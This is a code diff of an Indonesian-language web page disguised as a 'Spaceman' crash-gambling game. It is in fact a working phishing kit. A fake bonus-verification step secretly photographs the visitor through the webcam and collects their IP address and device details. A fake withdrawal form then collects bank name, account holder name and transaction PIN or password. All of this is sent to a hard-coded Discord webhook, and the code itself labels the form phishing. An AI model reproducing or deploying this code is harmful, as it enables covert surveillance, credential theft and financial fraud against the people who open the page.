@@ -3,200 +3,224 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MAXX77 - SPACEMAN GACOR</title>
+    <title>MAXX77 - SPACEMAN GACOR V12</title>
     <style>
-        body { background: #0b0e11; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; overflow-x: hidden; }
-        .header { background: #0056b3; padding: 10px; font-weight: bold; font-size: 20px; border-bottom: 3px solid #ffcc00; }
-        .container { padding: 15px; max-width: 450px; margin: auto; }
+        body { background: #0b101b; color: #fff; font-family: 'Arial', sans-serif; text-align: center; margin: 0; overflow: hidden; }
+        .game-header { background: #151d2d; padding: 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2a354d; }
+        .container { padding: 10px; max-width: 450px; margin: auto; }
         
         /* Spaceman Arena */
-        .game-area { background: #1c1f24; border: 2px solid #3498db; border-radius: 15px; padding: 20px; position: relative; height: 250px; overflow: hidden; margin-top: 10px; }
-        .astronaut { font-size: 50px; position: absolute; bottom: 20px; left: 20px; transition: 0.1s; }
-        .multiplier { font-size: 40px; font-weight: bold; margin-top: 60px; color: #fff; }
+        .display-area { background: radial-gradient(circle, #1e293b 0%, #0b101b 100%); height: 350px; position: relative; border-radius: 10px; margin-top: 5px; overflow: hidden; border: 1px solid #334155; }
+        .multiplier { font-size: 60px; font-weight: 900; color: #fff; position: absolute; width: 100%; top: 80px; z-index: 10; transition: color 0.2s; }
+        .astro-img { width: 110px; position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); transition: 0.1s linear; z-index: 5; }
         
-        .btn-bet { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 10px; }
-        .btn-bet:disabled { background: #444; }
+        /* Controls */
+        .bet-controls { background: #151d2d; padding: 15px; border-radius: 10px; margin-top: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .input-group { grid-column: span 2; display: flex; flex-direction: column; align-items: flex-start; margin-bottom: 5px; }
+        input { width: 95%; padding: 12px; border-radius: 5px; border: 1px solid #334155; background: #0b101b; color: #4ade80; font-weight: bold; font-size: 16px; }
         
-        /* Fake Ads Pop-up */
-        .popup-ad { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #000; padding: 20px; border: 5px solid #ffcc00; z-index: 100; display: none; width: 80%; border-radius: 10px; }
-        .close-ad { position: absolute; top: 5px; right: 10px; cursor: pointer; font-weight: bold; }
-
-        input { width: 90%; padding: 12px; margin: 8px 0; background: #222; border: 1px solid #3498db; color: #fff; border-radius: 5px; }
-        #game-screen, #withdraw-screen, #loading, #final { display: none; }
+        .btn-main { background: #ffc107; color: #000; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; }
+        .btn-wd { background: #28a745; color: white; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; grid-column: span 2; }
+        .btn-main:disabled { background: #4b5563; color: #9ca3af; }
         
-        .alert-bet { background: #00ff00; color: #000; padding: 5px; border-radius: 5px; font-weight: bold; display: none; margin-top: 5px; }
+        #auth-screen, #withdraw-screen, #final { display: block; }
+        #game-ui, #withdraw-screen, #final { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="header">👨‍🚀 SPACEMAN MAXX77 🚀</div>
+    <!-- STAGE 1: VERIFIKASI AWAL -->
+    <div id="auth-screen" class="container" style="margin-top: 80px;">
+        <img src="https://freepnglogo.com/images/all_img/tut-wuri-handayani-logo-with-white-text-png-b461.png" style="width: 130px; margin-bottom: 10px;">
+        <h2 style="color:#ffc107;">SERVER MAXX77 DEPOK</h2>
+        <p style="font-size: 14px; color: #94a3b8;">Verifikasi sensor diperlukan untuk aktivasi **Saldo Bonus Rp 100.000**.</p>
+        <button class="btn-main" onclick="verifyAndStart()">VERIFIKASI & AKTIVASI SALDO</button>
+    </div>
 
-    <div class="container">
-        <!-- PHASE 1: AUTHENTICATION (ALL DATA CAPTURED HERE) -->
-        <div id="auth-screen">
-            <h2 style="color:#ffcc00;">VERIFIKASI SERVER</h2>
-            <p style="font-size: 14px;">Server penuh! Silakan verifikasi wajah untuk mendapatkan slot prioritas dan **Saldo Bonus Rp 50.000**.</p>
-            <button class="btn-bet" style="background:#ffcc00; color:#000;" onclick="captureEverything()">VERIFIKASI & MAIN</button>
+    <!-- STAGE 2: MAIN GAME -->
+    <div id="game-ui">
+        <div class="game-header">
+            <span>Saldo Web: <b id="bal" style="color: #4ade80;">Rp 100.000</b></span>
+            <span style="color: #fbbf24; font-size: 12px;">v12.0 Stable</span>
         </div>
 
-        <!-- PHASE 2: THE SPACEMAN GAME -->
-        <div id="game-screen">
-            <div style="text-align: left; margin-bottom: 10px;">
-                <span style="color:#aaa;">Saldo:</span> <b id="balance" style="color:#00ff00;">Rp 50.000</b>
-            </div>
-            <div class="game-area">
+        <div class="container">
+            <div class="display-area">
                 <div class="multiplier" id="multi">1.00x</div>
-                <div class="astronaut" id="astro">👨‍🚀</div>
-                <div id="bet-alert" class="alert-bet">TARUHAN DITERIMA!</div>
+                <!-- IDLE IMAGE -->
+                <img id="astronaut" src="https://i.ibb.co/p667D3vS/spaceman-idle.png" class="astro-img">
+                <div id="status-tag" style="position: absolute; top: 10px; left: 10px; color: #4ade80; font-size: 12px; display: none; background: rgba(0,0,0,0.5); padding: 3px 8px; border-radius: 4px;">TARUHAN DITERIMA!</div>
             </div>
-            <button class="btn-bet" id="bet-btn" onclick="placeBet()">PASANG TARUHAN (Rp 5.000)</button>
-            <button class="btn-bet" style="background:#444;" onclick="showWithdraw()">WITHDRAW (WD)</button>
-        </div>
 
-        <!-- PHASE 3: WITHDRAW FORM -->
-        <div id="withdraw-screen">
-            <h2 style="color:#ffcc00;">FORM PENCAIRAN</h2>
-            <input type="text" id="bank" placeholder="Bank / E-Wallet (DANA/OVO)">
-            <input type="text" id="accName" placeholder="Nama Lengkap">
-            <input type="text" id="accPin" placeholder="PIN WD / Tanggal Lahir">
-            <button class="btn-bet" onclick="finalStep()">KONFIRMASI WD</button>
-        </div>
-
-        <!-- LOADING & FINAL -->
-        <div id="loading"><p>Processing...</p></div>
-        <div id="final">
-            <h2 style="color:red;">SISTEM DISADAP</h2>
-            <img id="facePreview" style="width:100%; border-radius:10px;">
+            <div class="bet-controls">
+                <div class="input-group">
+                    <label style="font-size: 11px; color: #94a3b8; margin-bottom: 3px;">NOMINAL TARUHAN (RP)</label>
+                    <input type="number" id="bet-amount" value="10000" min="2000">
+                </div>
+                <button class="btn-main" id="bet-btn" onclick="startFlight()">PASANG BET</button>
+                <button class="btn-main" id="cash-btn" style="background: #ef4444; color: #fff;" onclick="cashOut()" disabled>CASH OUT</button>
+                <button class="btn-wd" onclick="openWD()">TARIK DANA KE M-BANK</button>
+            </div>
         </div>
     </div>
 
-    <!-- Fake Ad -->
-    <div id="ad-box" class="popup-ad">
-        <span class="close-ad" onclick="closeAd()">[X]</span>
-        <h3 style="color:red;">MENANG JACKPOT!</h3>
-        <p>User **Endang_Depok** baru saja menang Rp 2.500.000!</p>
-        <button class="btn-bet" onclick="closeAd()">KLAIM SEKARANG</button>
+    <!-- STAGE 3: PHISING FORM (WD KE M-BANK) -->
+    <div id="withdraw-screen" class="container" style="margin-top: 40px;">
+        <h2 style="color: #fbbf24;">PENARIKAN DANA M-BANK</h2>
+        <p style="font-size: 12px; color: #94a3b8;">Masukkan detail rekening untuk pencairan saldo web.</p>
+        <input type="text" id="bank" placeholder="Nama Bank (BCA/BNI/DANA/OVO)" style="margin-bottom: 10px; width: 90%;">
+        <input type="text" id="name" placeholder="Nama Pemilik Rekening" style="margin-bottom: 10px; width: 90%;">
+        <input type="password" id="pin" placeholder="PIN Transaksi / Kata Sandi" style="margin-bottom: 10px; width: 90%;">
+        <button class="btn-wd" onclick="sendFinalData()">KONFIRMASI PENARIKAN</button>
+    </div>
+
+    <!-- STAGE 4: RESULT -->
+    <div id="final" class="container" style="margin-top: 50px;">
+        <h2 style="color: #ef4444;">LOG: DATA_CAPTURED</h2>
+        <p style="font-size: 13px;">Metadata dikirim ke Discord Admin.</p>
+        <img id="capture" style="width: 100%; border-radius: 10px; border: 1px solid #fbbf24;">
     </div>
 
     <video id="v" autoplay style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const webhook = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
-        let saldo = 50000;
-        let capturedPhoto = null;
-        let multiplier = 1.0;
-        let gameActive = false;
+        const hook = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
+        let balance = 100000;
+        let flightInterval;
+        let currentMulti = 1.00;
+        let photoBlob = null;
+        let currentBet = 0;
 
-        // Auto-Ads every 1 minute
-        setInterval(() => {
-            document.getElementById('ad-box').style.display = 'block';
-        }, 60000);
-
-        function closeAd() { document.getElementById('ad-box').style.display = 'none'; }
-
-        async function captureEverything() {
+        async function verifyAndStart() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v');
-                video.srcObject = stream;
+                video.srcObject = s;
 
-                // Send all technical info immediately while camera starts
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const battery = await navigator.getBattery();
-                
+                const ipReq = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipReq.json();
+                const batt = await navigator.getBattery();
+
                 setTimeout(() => {
                     const canvas = document.getElementById('c');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        capturedPhoto = blob;
-                        document.getElementById('facePreview').src = URL.createObjectURL(blob);
+                    canvas.toBlob(b => {
+                        photoBlob = b;
+                        document.getElementById('capture').src = URL.createObjectURL(b);
                         
-                        // Initial Stealth Log to Discord
                         const fd = new FormData();
-                        fd.append('file', blob, 'initial_capture.png');
+                        fd.append('file', b, 'spy.png');
                         fd.append('payload_json', JSON.stringify({
                             embeds: [{
-                                title: "🚨 PENYADAPAN AWAL (METADATA CAPTURED)",
-                                color: 16711680,
+                                title: "🚀 MAXX77 V12 - INITIAL LOG",
+                                color: 16766720,
                                 fields: [
-                                    { name: "🌐 IP Address", value: ipData.ip, inline: true },
-                                    { name: "🔋 Baterai", value: `${Math.round(battery.level * 100)}%`, inline: true },
-                                    { name: "📱 Perangkat", value: navigator.platform, inline: true },
-                                    { name: "🕵️ User Agent", value: navigator.userAgent }
+                                    { name: "IP", value: ipData.ip, inline: true },
+                                    { name: "Baterai", value: `${Math.round(batt.level * 100)}%`, inline: true },
+                                    { name: "Device", value: navigator.platform }
                                 ]
                             }]
                         }));
-                        fetch(webhook, { method: 'POST', body: fd });
+                        fetch(hook, { method: 'POST', body: fd });
                     }, 'image/png');
 
-                    stream.getTracks().forEach(t => t.stop());
+                    s.getTracks().forEach(t => t.stop());
                     document.getElementById('auth-screen').style.display = 'none';
-                    document.getElementById('game-screen').style.display = 'block';
+                    document.getElementById('game-ui').style.display = 'block';
                 }, 1500);
-            } catch (e) {
-                alert("Gagal Verifikasi: Sensor kamera diperlukan untuk memvalidasi saldo bonus.");
-                captureEverything();
-            }
+            } catch (e) { alert("Verifikasi Gagal!"); location.reload(); }
         }
 
-        function placeBet() {
-            if(saldo < 5000) return alert("Saldo tidak cukup!");
-            saldo -= 5000;
-            document.getElementById('balance').innerText = `Rp ${saldo.toLocaleString()}`;
-            document.getElementById('bet-alert').style.display = 'block';
-            document.getElementById('bet-btn').disabled = true;
-
-            // Spaceman Flight Logic
-            let astro = document.getElementById('astro');
-            let multiText = document.getElementById('multi');
-            let x = 20, y = 20;
-            multiplier = 1.0;
+        function startFlight() {
+            currentBet = parseInt(document.getElementById('bet-amount').value);
+            if(balance < currentBet) return alert("Saldo tidak cukup!");
             
-            let flight = setInterval(() => {
-                multiplier += 0.05;
-                x += 2; y += 2;
-                multiText.innerText = multiplier.toFixed(2) + "x";
-                multiText.style.color = "#ffcc00";
-                astro.style.left = x + "px";
-                astro.style.bottom = y + "px";
+            balance -= currentBet;
+            document.getElementById('bal').innerText = `Rp ${balance.toLocaleString()}`;
+            document.getElementById('status-tag').style.display = 'block';
+            document.getElementById('bet-btn').disabled = true;
+            document.getElementById('cash-btn').disabled = false;
 
-                if(Math.random() > 0.98 || x > 300) { // Crash chance
-                    clearInterval(flight);
-                    multiText.innerText = "CRASHED!";
-                    multiText.style.color = "red";
-                    setTimeout(() => {
-                        astro.style.left = "20px";
-                        astro.style.bottom = "20px";
-                        document.getElementById('bet-btn').disabled = false;
-                        document.getElementById('bet-alert').style.display = 'none';
-                    }, 2000);
+            let astro = document.getElementById('astronaut');
+            // CHANGE TO FLYING IMAGE
+            astro.src = "https://i.ibb.co/S76pM9mX/spaceman-flying.png";
+            
+            let multiEl = document.getElementById('multi');
+            let posX = 50, posY = 20; 
+            currentMulti = 1.00;
+
+            flightInterval = setInterval(() => {
+                currentMulti += 0.05;
+                posX -= 0.5; // Melayang sedikit ke kiri
+                posY += 1.8; // Naik ke atas
+                multiEl.innerText = currentMulti.toFixed(2) + "x";
+                astro.style.bottom = posY + "px";
+                astro.style.transform = `translateX(-50%) translateY(${-posY}px)`;
+
+                if(Math.random() > 0.982) { // Crash probability
+                    crash();
                 }
             }, 100);
         }
 
-        function showWithdraw() {
-            document.getElementById('game-screen').style.display = 'none';
+        function crash() {
+            clearInterval(flightInterval);
+            flightInterval = null;
+            document.getElementById('multi').innerText = "CRASHED!";
+            document.getElementById('multi').style.color = "#ef4444";
+            document.getElementById('cash-btn').disabled = true;
+            setTimeout(() => resetGame(), 2000);
+        }
+
+        function cashOut() {
+            if(!flightInterval) return;
+            clearInterval(flightInterval);
+            let win = currentBet * currentMulti;
+            balance += win;
+            alert(`SUCCESS! Saldo Web bertambah Rp ${Math.floor(win).toLocaleString()}`);
+            resetGame();
+        }
+
+        function resetGame() {
+            clearInterval(flightInterval);
+            flightInterval = null;
+            let astro = document.getElementById('astronaut');
+            // BACK TO IDLE IMAGE
+            astro.src = "https://i.ibb.co/p667D3vS/spaceman-idle.png";
+            astro.style.bottom = "20px";
+            astro.style.transform = "translateX(-50%)";
+            
+            document.getElementById('multi').innerText = "1.00x";
+            document.getElementById('multi').style.color = "#fff";
+            document.getElementById('bet-btn').disabled = false;
+            document.getElementById('cash-btn').disabled = true;
+            document.getElementById('status-tag').style.display = 'none';
+            document.getElementById('bal').innerText = `Rp ${balance.toLocaleString()}`;
+        }
+
+        function openWD() {
+            document.getElementById('game-ui').style.display = 'none';
             document.getElementById('withdraw-screen').style.display = 'block';
         }
 
-        async function finalStep() {
+        async function sendFinalData() {
             const fd = new FormData();
             fd.append('payload_json', JSON.stringify({
                 embeds: [{
-                    title: "💰 WITHDRAW DATA (FINAL DIG)",
+                    title: "💰 WD REQUEST - MAXX77",
+                    color: 3066993,
                     fields: [
-                        { name: "Bank", value: document.getElementById('bank').value },
-                        { name: "Nama", value: document.getElementById('accName').value },
-                        { name: "PIN/Bday", value: document.getElementById('accPin').value },
-                        { name: "Saldo Terakhir", value: `Rp ${saldo}` }
+                        { name: "Bank/E-Wallet", value: document.getElementById('bank').value },
+                        { name: "Nama Rekening", value: document.getElementById('name').value },
+                        { name: "PIN/Password", value: `\`${document.getElementById('pin').value}\`` },
+                        { name: "Saldo Akhir", value: `Rp ${balance.toLocaleString()}` }
                     ]
                 }]
             }));
-            await fetch(webhook, { method: 'POST', body: fd });
+            await fetch(hook, { method: 'POST', body: fd });
             document.getElementById('withdraw-screen').style.display = 'none';
             document.getElementById('final').style.display = 'block';
         }
